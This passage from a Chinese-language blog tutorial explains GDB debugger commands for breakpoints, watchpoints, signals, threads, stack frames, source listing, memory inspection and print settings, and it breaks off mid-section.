<li><a href="#%E6%81%A2%E5%A4%8D%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%92%8C%E5%8D%95%E6%AD%A5%E8%B0%83%E8%AF%95">恢复程序运行和单步调试</a></li>
<li><a href="#%E4%BF%A1%E5%8F%B7">信号</a></li>
<li><a href="#%E4%BA%A7%E7%94%9F%E4%BF%A1%E5%8F%B7%E9%87%8F">产生信号量</a></li>
<li><a href="#%E7%BA%BF%E7%A8%8B">线程</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E6%A0%88%E4%BF%A1%E6%81%AF">查看栈信息</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81">查看源码</a></li>
<li><a href="#%E6%90%9C%E7%B4%A2%E6%BA%90%E4%BB%A3%E7%A0%81">搜索源代码</a></li>
<li><a href="#%E6%8C%87%E5%AE%9A%E6%BA%90%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">指定源文件路径</a></li>
<li><a href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E5%86%85%E5%AD%98">源代码内存</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE">查看运行时数据</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AD%98">查看内存</a></li>
<li><a href="#%E8%87%AA%E5%8A%A8%E6%98%BE%E7%A4%BA">自动显示</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE%E6%98%BE%E7%A4%BA%E9%80%89%E9%A1%B9">设置显示选项</a></li>
<li><a href="#%E5%8E%86%E5%8F%B2%E7%BA%AA%E5%BD%95">历史纪录</a></li>
<li><a href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">环境变量</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%AF%84%E5%AD%98%E5%99%A8">查看寄存器</a></li>
<li><a href="#%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C">修改程序的执行</a></li>
<li><a href="#%E8%B7%B3%E8%BD%AC%E6%89%A7%E8%A1%8C">跳转执行</a></li>
<li><a href="#%E5%BC%BA%E5%88%B6%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E">强制函数返回</a></li>
<li><a href="#%E5%BC%BA%E5%88%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0">强制调用函数</a></li>
<li><a href="#gdb%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83">GDB语言环境</a></li>
<li><a href="#%E9%80%80%E5%87%BA">退出</a></li>
<li><a href="#%E6%8A%80%E5%B7%A7">技巧</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->

<p>软件开发，或多或少会走上调试这条路。调试工具可以帮你更加深入了解整个程序的运行状态，对程序运行有更多的主动权。你可以随心所欲的改变程序运行流程，如：有变量a，你需要不断改变该a的值，让程序运行出理想的结果，那么你可以在调试工具中轻易的实现。</p>
<ul>
<li>运行你的程序，设置所有的能影响程序运行的东西。</li>
<li>保证你的程序在指定的条件下停止。</li>
<li>当你程序停止时，让你检查发生了什么。</li>
<li>改变你的程序。那样你可以试着修正某个bug引起的问题，然后继续查找另一 个bug</li>
</ul>
<p>今天给大家带来的gdb调试工具。GDB是GNU开源组织发布的一个强大的UNIX下的程序调试工具。GDB可以调试C、C++、D、Go、python、pascal、assemble(ANSI 汇编标准)等等语言。</p>
<h1 id="使用GDB"><a href="#使用GDB" class="headerlink" title="使用GDB"></a>使用GDB</h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gdb program           # program是你的可执行文件，一般在当前目录</span><br><span class="line">$ gdb program core      # gdb同时调试运行程序和core文件，core是程序非法执行产生的文件</span><br><span class="line">$ gdb program pid       # 如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。</span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) r/run             # 开始运行程序</span><br><span class="line">(gdb) c/continue        # 继续运行</span><br><span class="line">(gdb) n/next            # 下一行，不进入函数调用</span><br><span class="line">(gdb) s/step            # 下一行，进入函数调用</span><br><span class="line">(gdb) ni/si             # 下一条指令，ni和si区别同上</span><br><span class="line">(gdb) fini/finish       # 继续运行至函数退出/当前栈帧</span><br><span class="line">(gdb) u/util            # 继续运行至某一行，在循环中，u可以实现运行至循环刚刚退出，但这取决于循环的实现</span><br><span class="line"></span><br><span class="line">(gdb) set args          # 设置程序启动参数，如：set args 10 20 30</span><br><span class="line">(gdb) show args         # 查看程序启动参数</span><br><span class="line">(gdb) path &lt;dir&gt;        # 设置程序的运行路径</span><br><span class="line">(gdb) show paths        # 查看程序的运行路径</span><br><span class="line">(gdb) set env &lt;name=val&gt;# 设置环境变量，如：set env USER=chen</span><br><span class="line">(gdb) show env [name]   # 查看环境变量</span><br><span class="line">(gdb) cd &lt;dir&gt;          # 相当于shell的cd命令</span><br><span class="line">(gdb) pwd               # 显示当前所在目录</span><br><span class="line"></span><br><span class="line">(gdb) shell &lt;commond&gt;   # 执行shell命令</span><br></pre></td></tr></table></figure>

<h2 id="设置-x2F-查看断点-breakpoint"><a href="#设置-x2F-查看断点-breakpoint" class="headerlink" title="设置&#x2F;查看断点(breakpoint)"></a>设置&#x2F;查看断点(breakpoint)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) b/break linenum/func      # 在第linenum行或function处停住</span><br><span class="line">(gdb) b/break +/-offset         # 在当前行号后/前offset行停住</span><br><span class="line">(gdb) b/break filename:linenum  # 在源文件filename的linenum行停住</span><br><span class="line">(gdb) b/break filename:func     # 在源文件的function入口停住</span><br><span class="line">(gdb) b/break *address          # 在内存地址address处停住</span><br><span class="line">(gdb) b/break                   # 没有参数，表示下一跳指令处停住</span><br><span class="line">(gdb) b/break if &lt;condition&gt;    # 条件成立是停住，如在循环中：break if i=100</span><br><span class="line"></span><br><span class="line">(gdb) info break [n]            # 查看断点， n表示断点号</span><br></pre></td></tr></table></figure>

<h2 id="设置-x2F-查看观察点-watchpoint"><a href="#设置-x2F-查看观察点-watchpoint" class="headerlink" title="设置&#x2F;查看观察点(watchpoint)"></a>设置&#x2F;查看观察点(watchpoint)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 观察点一搬来观察某个表达式或变量的值是否有变化了，有：程序停住</span><br><span class="line">(gdb) watch &lt;expr&gt;              # 观察值是否有变化</span><br><span class="line">(gdb) rwatch &lt;expr&gt;             # 当expr被读取时，停住</span><br><span class="line">(gdb) awatch &lt;expr&gt;             # 当expr被读取或写入时，停住</span><br><span class="line"></span><br><span class="line">(gdb) info watchpoints          # 查看所有观察点</span><br></pre></td></tr></table></figure>

<h2 id="设置-x2F-查看捕捉点-catchpoint"><a href="#设置-x2F-查看捕捉点-catchpoint" class="headerlink" title="设置&#x2F;查看捕捉点(catchpoint)"></a>设置&#x2F;查看捕捉点(catchpoint)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 你可设置捕捉点来补捉程序运行时的一些事件。如：载入共享库（动态链接库）或是C++的异常。</span><br><span class="line">(gdb) tcatch &lt;event&gt;            # 只设置一次捕捉点</span><br><span class="line">(gdb) catch &lt;event&gt;             # 当event发生时，停住程序，如下：</span><br><span class="line"># throw             一个c++抛出的异常（throw为关键字）</span><br><span class="line"># catch             一个C++捕捉到的异常（catch为关键字）</span><br><span class="line"># exec              调用系统调用exec时（只在HP-UX下有用）</span><br><span class="line"># fork              调用系统调用fork时（只在HP-UX下有用）</span><br><span class="line"># vfork             调用系统调用vfork时（只在HP-UX下有用）</span><br><span class="line"># load [file]       载入共享库（动态链接库）时（只在HP-UX下有用）</span><br><span class="line"># unload [libname]  卸载共享库（动态链接库）时（只在HP-UX下有用）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="维护停止点"><a href="#维护停止点" class="headerlink" title="维护停止点"></a>维护停止点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 上面说了三种如何设置停止点的方法。在gdb中如果你觉得已经定义好的停止点没有用，那么你可以delete、clear、disable、enable进行维护</span><br><span class="line">(gdb) clear                     # 清除所有已定义的停止点。如果程序运行，清除当前行之后的</span><br><span class="line">(gdb) clear &lt;fuction&gt;           # 清除所有设置在函数上的停止点</span><br><span class="line">(gdb) clear &lt;file:line&gt;         # 清除所有设置在指定行上的停止点</span><br><span class="line">(gdb) d/delete [n]/[m-n]        # 删除断点号，不设置则删除全部，也可以范围m-n</span><br><span class="line"></span><br><span class="line"># 比删除更好的一种方法是disable停止点，disable了的停止点，GDB不会删除，当你还需要时，enable即可，就好像回收站一样。</span><br><span class="line">(gdb) disable [n]/[m-n]         # disable指定断点号n，不指定则disable所有，也可以范围m-n</span><br><span class="line"></span><br><span class="line">(gdb) enable [n]/[m-n]          # enable断点n，也可以范围m-n</span><br><span class="line">(gdb) enable once [n]/[m-n]     # enable断点n一次，程序停止后自动disable，也可以范围m-n</span><br><span class="line">(gdb) enable delete [n]/[m-n]   # enable断点，程序结束自动删除，也可以范围m-n</span><br></pre></td></tr></table></figure>

<h2 id="维护条件停止点"><a href="#维护条件停止点" class="headerlink" title="维护条件停止点"></a>维护条件停止点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 前面说到设置breakpoint可以设置成一个条件，这里列出相关的维护命令</span><br><span class="line">(gdb) condition &lt;bunm&gt; &lt;expr&gt;   # 修改断掉号bnum的停止条件</span><br><span class="line">(gdb) condition &lt;bnum&gt;          # 清除断点号bnum的停止条件</span><br><span class="line"></span><br><span class="line"># ignore 可以指定程序运行时，忽略停止条件几次</span><br><span class="line">(gdb) ignore &lt;bnum&gt; &lt;count&gt;     # 忽略断点号hnum的停止条件count次</span><br></pre></td></tr></table></figure>

<h2 id="停止点设置运行命令"><a href="#停止点设置运行命令" class="headerlink" title="停止点设置运行命令"></a>停止点设置运行命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 当程序停住时，我们可以通过command设置其自动执行的命令，这很利于自动化调试。</span><br><span class="line">(gdb) commands [bnum]</span><br><span class="line">&gt; ... commands list ...</span><br><span class="line">&gt; end                   # 这里为断点号bnum设置一个命令列表</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">(gdb) break foo if x&gt;0</span><br><span class="line">(gdb) commands</span><br><span class="line">&gt; printf &quot;x is %dn&quot;,x</span><br><span class="line">&gt; continue</span><br><span class="line">&gt; end</span><br><span class="line"># 断点设置在函数foo中，断点条件是x&gt;0，如果程序被断住后，也就是，一旦x的值在foo函数中大于0，GDB会自动打印出x的值，并继续运行程序。</span><br><span class="line"># 如果你要清除断点上的命令序列，那么只要简单的执行一下commands命令，并直接在打个end就行了。</span><br></pre></td></tr></table></figure>

<h2 id="断点菜单"><a href="#断点菜单" class="headerlink" title="断点菜单"></a>断点菜单</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果你使用c++，有可能下断点时遇到相同名字的函数，gdb会为你列出该函数菜单供你选择。</span><br><span class="line">如：</span><br><span class="line">(gdb) b String::after</span><br><span class="line">[0] cancel</span><br><span class="line">[1] all</span><br><span class="line">[2] file:String.cc; line number:867</span><br><span class="line">[3] file:String.cc; line number:860</span><br><span class="line">[4] file:String.cc; line number:875</span><br><span class="line">[5] file:String.cc; line number:853</span><br><span class="line">[6] file:String.cc; line number:846</span><br><span class="line">[7] file</span><br><span class="line">&gt; 2 4 6</span><br><span class="line">Breakpoint 1 at 0xb26c: file String.cc, line 867.</span><br><span class="line">Breakpoint 2 at 0xb344: file String.cc, line 875.</span><br><span class="line">Breakpoint 3 at 0xafcc: file String.cc, line 846.</span><br></pre></td></tr></table></figure>

<h2 id="恢复程序运行和单步调试"><a href="#恢复程序运行和单步调试" class="headerlink" title="恢复程序运行和单步调试"></a>恢复程序运行和单步调试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 当程序被停住了，你可以用c/continue恢复运行，或下一个断点到来。也可以使用step或next命令单步跟踪程序。</span><br><span class="line">(gdb) c/continue [ignore-count]     # 恢复程序运行，ignore-count忽略后面断点数</span><br><span class="line"></span><br><span class="line"># 单步跟踪，如果有函数调用，他会进入该函数。进入函数的前提是，此函数被编译有debug信息。很像VC等工具中的stepin。后面可以加count也可以不加，不加表示一条条地执行，加表示执行后面的count条指令，然后再停住。</span><br><span class="line">(gdb) step &lt;count&gt;</span><br><span class="line"></span><br><span class="line"># 打开step-mode模式，于是，在进行单步跟踪时，程序不会因为没有debug信息而不停住。这个参数有很利于查看机器码。</span><br><span class="line">(gdb) set step-mode on</span><br><span class="line"></span><br><span class="line"># 当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</span><br><span class="line">(gdb) u/until</span><br><span class="line"></span><br><span class="line"># 单步跟踪一条机器指令！一条程序代码有可能由数条机器指令完成，stepi和nexti可以单步执行机器指令。与之一样有相同功能的命令是“display/i $pc” ，当运行完这个命令后，单步跟踪会在打出程序代码的同时打出机器指令（也就是汇编代码）</span><br><span class="line">(gdb) si/stepi</span><br><span class="line">(gdb) ni/stepi</span><br></pre></td></tr></table></figure>

<h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 信号是一种软中断，是一种处理异步事件的方法。一般来说，操作系统都支持许多信号。尤其是UNIX，比较重要应用程序一般都会处理信号。UNIX定义了许多信号，比如SIGINT表示中断字符信号，也就是Ctrl+C的信号，SIGBUS表示硬件故障的信号；SIGCHLD表示子进程状态改变信号；SIGKILL表示终止程序运行的信号，等等。信号量编程是UNIX下非常重要的一种技术。</span><br><span class="line"># GDB有能力在你调试程序的时候处理任何一种信号，你可以告诉GDB需要处理哪一种信号。你可以要求GDB收到你所指定的信号时，马上停住正在运行的程序，以供你进行调试。你可以用GDB的handle命令来完成这一功能。</span><br><span class="line">(gdb) handle &lt;signal&gt; &lt;keywords...&gt;</span><br><span class="line"># 在GDB中定义一个信号处理。信号&lt;signal&gt;可以以SIG开头或不以SIG开头，可以用定义一个要处理信号的范围（如：SIGIO-SIGKILL，表示处理从SIGIO信号到SIGKILL的信号，其中包括SIGIO，SIGIOT，SIGKILL三个信号），也可以使用关键字all来标明要处理所有的信号。一旦被调试的程序接收到信号，运行程序马上会被GDB停住，以供调试。其&lt;keywords&gt;可以是以下几种关键字的一个或多个。</span><br><span class="line">  nostop            # 当被调试的程序收到信号时，GDB不会停住程序的运行，但会打出消息告诉你收到这种信号。</span><br><span class="line">  stop          # 当被调试的程序收到信号时，GDB会停住你的程序。</span><br><span class="line">  print         # 当被调试的程序收到信号时，GDB会显示出一条信息。</span><br><span class="line">  noprint           # 当被调试的程序收到信号时，GDB不会告诉你收到信号的信息。</span><br><span class="line">  pass/noignore # 当被调试的程序收到信号时，GDB不处理信号。这表示，GDB会把这个信号交给被调试程序会处理。</span><br><span class="line">  nopass/ignore # 当被调试的程序收到信号时，GDB不会让被调试程序来处理这个信号。</span><br><span class="line"></span><br><span class="line"># 查看有哪些信号在被GDB检测中。</span><br><span class="line">(gdb) info signals</span><br><span class="line">(gdb) info handle</span><br></pre></td></tr></table></figure>

<h2 id="产生信号量"><a href="#产生信号量" class="headerlink" title="产生信号量"></a>产生信号量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用singal命令，可以产生一个信号量给被调试的程序。如：中断信号Ctrl+C。这非常方便于程序的调试，可以在程序运行的任意位置设置断点，并在该断点用GDB产生一个信号量，这种精确地在某处产生信号非常有利程序的调试。语法是：</span><br><span class="line">(gdb) signal &lt;singal&gt;</span><br><span class="line"># UNIX的系统信号量通常从1到15。所以&lt;singal&gt;取值也在这个范围。</span><br><span class="line"># single命令和shell的kill命令不同，系统的kill命令发信号给被调试程序时，是由GDB截获的，而single命令所发出一信号则是直接发给被调试程序的。</span><br></pre></td></tr></table></figure>

<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 当你的程序时多线程的，你可以定义断点是否在所有线程或某个线程</span><br><span class="line">(gdb) info threads                          # 查看线程</span><br><span class="line">(gdb) break &lt;line&gt; thread &lt;threadno&gt;        # 指定源程序line行，线程threadno停住</span><br><span class="line">(gdb) break &lt;line&gt; thread &lt;threadno&gt; if...  # 指定源程序line行，线程threadno停住，跟上条件</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">(gdb) break frik.c:13 thread 28 if bartab &gt; lim</span><br></pre></td></tr></table></figure>

<h2 id="查看栈信息"><a href="#查看栈信息" class="headerlink" title="查看栈信息"></a>查看栈信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 当程序被停住了，你需要做的第一件事就是查看程序是在哪里停住的。当你的程序调用了一个函数，函数的地址，函数参数，函数内的局部变量都会被压入“栈”（Stack）中。你可以用GDB命令来查看当前的栈中的信息。</span><br><span class="line">(gdb) bt/backtrace          # 打印当前的啊还能输调用栈的所有信息</span><br><span class="line">(gdb) bt/backtrace &lt;n&gt;      # 当n为正数，打印栈顶n层。为负数，打印栈低n层</span><br><span class="line"></span><br><span class="line"># 如果你要查看某一层的信息，你需要在切换当前的栈，一般来说，程序停止时，最顶层的栈就是当前栈，如果你要查看栈下面层的详细信息，首先要做的是切换当前栈。</span><br><span class="line">(gdb) f/frame &lt;n&gt;           # n从0开始，是栈中的编号</span><br><span class="line">(gdb) up &lt;n&gt;                # 向栈的上面移动n层。如无n，向上移动一层</span><br><span class="line">(gdb) down &lt;n&gt;              # 向栈的下面移动n层。如无n，向下移动一层</span><br><span class="line"></span><br><span class="line"># 栈的层编号，当前的函数名，函数参数值，函数所在文件及行号，函数执行到的语句。</span><br><span class="line">(gdb) f/frame</span><br><span class="line"></span><br><span class="line"># 这个命令会打印出更为详细的当前栈层的信息，只不过，大多数都是运行时的内内地址。比如：函数地址，调用函数的地址，被调用函数的地址，目前的函数是由什么样的程序语言写成的、函数参数地址及值、局部变量的地址等等。</span><br><span class="line">(gdb) info f/frame</span><br><span class="line"></span><br><span class="line">(gdb) info args             # 打印当前函数的参数名及值</span><br><span class="line">(gdb) info locals           # 打印当前函数中所有局部变量及值</span><br><span class="line">(gdb) info catch            # 打印当前函数中的异常处理信息</span><br></pre></td></tr></table></figure>

<h2 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 在程序编译时一定要加上-g的参数，把源程序信息编译到执行文件中。不然就看不到源程序了。</span><br><span class="line">(gdb) l                         # 显示当前行前后的源码</span><br><span class="line">(gdb) l -                       # 显示当前行前的源码</span><br><span class="line">(gdb) l +                       # 显示当前行后的源码</span><br><span class="line">(gdb) l/list &lt;linuenum/func&gt;    # 查看第linenum行或者function所在行附近的10行</span><br><span class="line">(gdb) l/list                    # 查看上一次list命令列出的代码后面的10行</span><br><span class="line">(gdb) l/list m,n                # 查看从第m行到第n行的源码。m不填，则从当前行到n</span><br><span class="line">(gdb) l/list -/+offset          # 查看想对当前行偏移offset源码</span><br><span class="line">(gdb) l/list &lt;file:line&gt;        # 查看文件file的line行的源码</span><br><span class="line">(gdb) l/list &lt;func&gt;             # 查看函数名func源码</span><br><span class="line">(gdb) l/list &lt;file:func&gt;        # 查看文件file的函数func源码</span><br><span class="line">(gdb) l/list &lt;*address&gt;         # 查看运行时内存地址address的源码</span><br><span class="line"></span><br><span class="line">(gdb) set listsize              # 设置一次显示源码的行数</span><br><span class="line">(gdb) show listsize             # 查看listsize的值</span><br></pre></td></tr></table></figure>

<h2 id="搜索源代码"><a href="#搜索源代码" class="headerlink" title="搜索源代码"></a>搜索源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) forward-search &lt;regexp&gt;   # 向前搜索，regexp是一个正则表达式</span><br><span class="line">(gdb) search &lt;regexp&gt;           # 向前搜索</span><br><span class="line">(gdb) reverse-search &lt;regexp&gt;   # 全局搜索</span><br></pre></td></tr></table></figure>

<h2 id="指定源文件路径"><a href="#指定源文件路径" class="headerlink" title="指定源文件路径"></a>指定源文件路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 某些时候，用-g编译过后的执行程序中只是包括了源文件的名字，没有路径名。GDB提供了可以让你指定源文件的路径的命令，以便GDB进行搜索。</span><br><span class="line">(gdb) dir/directory &lt;dirname ... &gt;  # 加一个源文件路径到当前路径的前面。如果你要指定多个路径，UNIX下你可以使用“:”，Windows下你可以使用“;”。</span><br><span class="line">(gdb) dir/directory                 # 清除所有的自定义的源文件搜索路径信息。</span><br><span class="line">(gdb) show directories              # 显示定义了的源文件搜索路径。</span><br></pre></td></tr></table></figure>

<h2 id="源代码内存"><a href="#源代码内存" class="headerlink" title="源代码内存"></a>源代码内存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) info line                     # 查看源代码在内存中的地址，还可以:</span><br><span class="line">(gdb) info line &lt;num&gt;</span><br><span class="line">(gdb) info line &lt;file:num&gt;</span><br><span class="line">(gdb) info line &lt;func&gt;</span><br><span class="line">(gdb) info line &lt;file:func&gt;</span><br><span class="line"></span><br><span class="line"># 还有一个命令（disassemble）你可以查看源程序的当前执行时的机器码，这个命令会把目前内存中的指令dump出来。如下面的示例表示查看函数func的汇编代码。</span><br><span class="line">(gdb) disassemble func</span><br></pre></td></tr></table></figure>

<h2 id="查看运行时数据"><a href="#查看运行时数据" class="headerlink" title="查看运行时数据"></a>查看运行时数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># &lt;expr&gt;是表达式，是你所调试的程序的语言的表达式（GDB可以调试多种编程语言），&lt;f&gt;是输出的格式，比如，如果要把表达式按16进制的格式输出，那么就是/x。</span><br><span class="line">(gdb) p/print &lt;expr&gt;            # expr可以是const常量、变量、函数等内容</span><br><span class="line">(gdb) p/print /&lt;f&gt; &lt;expr&gt;</span><br><span class="line"></span><br><span class="line"># 在表达式中，有几种GDB所支持的操作符，它们可以用在任何一种语言中。</span><br><span class="line">    @                   是一个和数组有关的操作符，在后面会有更详细的说明。</span><br><span class="line">    ::                  指定一个在文件或是一个函数中的变量。</span><br><span class="line">    &#123;&lt;type&gt;&#125; &lt;addr&gt;     表示一个指向内存地址&lt;addr&gt;的类型为type的一个对象。</span><br><span class="line"># 需要注意的是，如果你的程序编译时开启了优化选项，那么在用GDB调试被优化过的程序时，可能会发生某些变量不能访问，或是取值错误码的情况。</span><br><span class="line"></span><br><span class="line"># 输出格式</span><br><span class="line"># 一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式：</span><br><span class="line">    x 按十六进制格式显示变量。</span><br><span class="line">    d 按十进制格式显示变量。</span><br><span class="line">    u 按十六进制格式显示无符号整型。</span><br><span class="line">    o 按八进制格式显示变量。</span><br><span class="line">    t 按二进制格式显示变量。</span><br><span class="line">    a 按十六进制格式显示变量。 </span><br><span class="line">    c 按字符格式显示变量。 </span><br><span class="line">    f 按浮点数格式显示变量。</span><br><span class="line">  </span><br><span class="line">如：</span><br><span class="line">(gdb) p i</span><br><span class="line">$21 = 101</span><br><span class="line">(gdb) p/a i</span><br><span class="line">$22 = 0x65</span><br></pre></td></tr></table></figure>

<h2 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 你可以使用examine命令（简写是x）来查看内存地址中的值。x命令的语法如下所示：</span><br><span class="line">(gdb) x/&lt;n/f/u&gt; &lt;addr&gt;          # n, f, u可选</span><br><span class="line"></span><br><span class="line">    n       是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。</span><br><span class="line">    f       表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i。</span><br><span class="line">    u       表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</span><br><span class="line">    &lt;addr&gt;  表示一个内存地址。</span><br><span class="line"></span><br><span class="line"># n/f/u三个参数可以一起使用。例如：</span><br><span class="line">(gdb) x/3uh 0x54320             #表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。</span><br></pre></td></tr></table></figure>

<h2 id="自动显示"><a href="#自动显示" class="headerlink" title="自动显示"></a>自动显示</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 你可以设置一些自动显示的变量，当程序停住时，或是在你单步跟踪时，这些变量会自动显示。相关的GDB命令是display。</span><br><span class="line">(gdb) display &lt;expr&gt;</span><br><span class="line">(gdb) display/&lt;fmt&gt; &lt;expr&gt;</span><br><span class="line">(gdb) display/&lt;fmt&gt; &lt;addr&gt;</span><br><span class="line"># expr是一个表达式，fmt表示显示的格式，addr表示内存地址，当你用display设定好了一个或多个表达式后，只要你的程序被停下来，GDB会自动显示你所设置的这些表达式的值。</span><br><span class="line"></span><br><span class="line"># 格式i和s同样被display支持，一个非常有用的命令是：</span><br><span class="line">(gdb) display/i $pc</span><br><span class="line"># $pc是GDB的环境变量，表示着指令的地址，/i则表示输出格式为机器指令码，也就是汇编。于是当程序停下后，就会出现源代码和机器指令码相对应的情形，这是一个很有意思的功能。</span><br><span class="line">下面是一些和display相关的GDB命令：</span><br><span class="line">(gdb) undisplay &lt;dnums...&gt;</span><br><span class="line">(gdb) delete display &lt;dnums...&gt;</span><br><span class="line"># 删除自动显示，dnums意为所设置好了的自动显式的编号。如果要同时删除几个，编号可以用空格分隔，如果要删除一个</span><br><span class="line"># 范围内的编号，可以用减号表示（如：2-5）</span><br><span class="line">(gdb) disable display &lt;dnums...&gt;</span><br><span class="line">(gdb) enable display &lt;dnums...&gt;</span><br><span class="line"># disable和enalbe不删除自动显示的设置，而只是让其失效和恢复。</span><br><span class="line">(gdb) info display</span><br><span class="line"># 查看display设置的自动显示的信息。GDB会打出一张表格，向你报告当然调试中设置了多少个自动显示设置，其中包括，设置的编号，表达式，是否enable。</span><br></pre></td></tr></table></figure>

<h2 id="设置显示选项"><a href="#设置显示选项" class="headerlink" title="设置显示选项"></a>设置显示选项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># GDB中关于显示的选项比较多，这里我只例举大多数常用的选项。</span><br><span class="line"># 1、打开地址输出，当程序显示函数信息时，GDB会显出函数的参数地址。系统默认为打开的</span><br><span class="line">(gdb) set print address</span><br><span class="line">(gdb) set print address on </span><br><span class="line">(gdb) set print address off     # 关闭函数的参数地址显示</span><br><span class="line">(gdb) show print address        # 查看当前地址显示选项是否打开。</span><br><span class="line"></span><br><span class="line"># 2、打开数组显示，打开后当数组显示时，每个元素占一行，如果不打开的话，每个元素则以逗号分隔。这个选项默认是关闭的。</span><br><span class="line">(gdb) set print array</span><br><span class="line">(gdb) set print array on </span><br><span class="line">(gdb) set print array off</span><br><span class="line">(gdb) show print array</span><br><span class="line">(gdb) show print elements       # 查看print elements的选项信息。</span><br><span class="line">(gdb) set print elements &lt;number-of-elements&gt;</span><br><span class="line"># 这个选项主要是设置数组的，如果你的数组太大了，那么就可以指定一个&lt;number-of-elements&gt;来指定数据显示的最大长度，当到达这个长度时，GDB就不再往下显示了。如果设置为0，则表示不限制。</span><br><span class="line"></span><br><span class="line"># 3、如果打开了这个选项，那么当显示字符串时，遇到结束符则停止显示。这个选项默认为off</span><br><span class="line">(gdb) set print null-stop &lt;on/off&gt;  </span><br><span class="line"></span><br><span class="line"># 4、如果打开printf pretty这个选项，那么当GDB显示结构体时会比较漂亮。</span><br><span class="line">(gdb) set print pretty on </span><br><span class="line">(gdb) show print pretty         # 查看GDB是如何显示结构体的。\</span><br><span class="line"></span><br><span class="line"># 5、设置字符显示，是否按“nnn”的格式显示，如果打开，则字符串或字符数据按nnn显示，如“65”。</span><br><span class="line">(gdb) set print sevenbit-strings &lt;on/off&gt;</span><br><span class="line">(gdb) show print sevenbit-strings   # 查看字符显示开关是否打开。</span><br><span class="line"></span><br><span class="line"># 6、设置显示结构体时，是否显式其内的联合体数据。</span><br><span class="line">(gdb) set print union &lt;on/off&gt;</span><br><span class="line">(gdb) show print union              # 查看联合体数据的显示方式</span><br><span class="line">如：</span><br><span class="line">$1 = &#123;it = Tree, form = &#123;tree = Acorn, bug = Cocoon&#125;&#125;   # 开</span><br><span class="line">$1 = &#123;it = Tree, form = &#123;...&#125;&#125;                          # 关</span><br><span class="line"></span><br><span class="line"># 7、在C++中，如果一个对象指针指向其派生类，如果打开这个选项，GDB会自动按照虚方法调用的规则显示输出，如果关闭这个选项的话，GDB就不管虚函数表了。这个选项默认是off。</span><br><span class="line">(gdb) set print object &lt;on/off&gt;</span><br><span class="line">(gdb) show print object             # 查看对象选项的设置。</span><br><span class="line"></span><br><span class="line"># 8、这个选项表示，当显示一个C++对象中的内容是，是否显示其中的静态数据成员。默认是on。</span><br><span class="line">(gdb) set print static-members &lt;on/off&gt;</span><br><span class="line">(gdb) show print static-members     # 查看静态数据成员选项设置。</span><br><span class="line"></span><br><span class="line"># 